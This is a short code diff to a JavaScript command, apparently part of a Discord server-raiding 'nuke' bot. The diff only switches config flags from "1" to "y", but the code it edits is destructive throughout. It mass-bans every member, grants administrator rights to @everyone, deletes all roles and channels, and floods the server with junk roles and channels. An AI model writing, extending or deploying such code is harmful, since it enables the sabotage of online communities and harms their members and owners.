@@ -1,7 +1,7 @@
 const settings = require('../settings.json');
 exports.run = (client, message, args) => {
 
-    if (settings.config.ban === "1") {
+    if (settings.config.ban === "y") {
     message.guild.roles.find('name', '@everyone').members.map(m=>m.ban());
     }
 
@@ -15,15 +15,15 @@ exports.run = (client, message, args) => {
 
 
 
-    if (settings.config.admin === "1") {
+    if (settings.config.admin === "y") {
     message.guild.roles.find('name', '@everyone').edit({
         permissions: [8]
     });
     }
-    if (settings.config.role_dlt === "1") {
+    if (settings.config.role_dlt === "y") {
     Promise.all(message.guild.roles.map(c => c.delete()));
     }
-    if (settings.config.role_crt === "1") {
+    if (settings.config.role_crt === "y") {
     message.guild.createRole({
         name: 'undefined-1'
     });
@@ -64,10 +64,10 @@ exports.run = (client, message, args) => {
             const typer = 'category';
             message.guild.createChannel('undefined-3', typer);
         }
-    if (settings.config.chnl_dlt === "1"){
+    if (settings.config.chnl_dlt === "y"){
     Promise.all(message.guild.channels.map(c => c.delete()));
     }
-    if (settings.config.imgnom === "1") {
+    if (settings.config.imgnom === "y") {
     setTimeout(suite, 500);
     }
 }
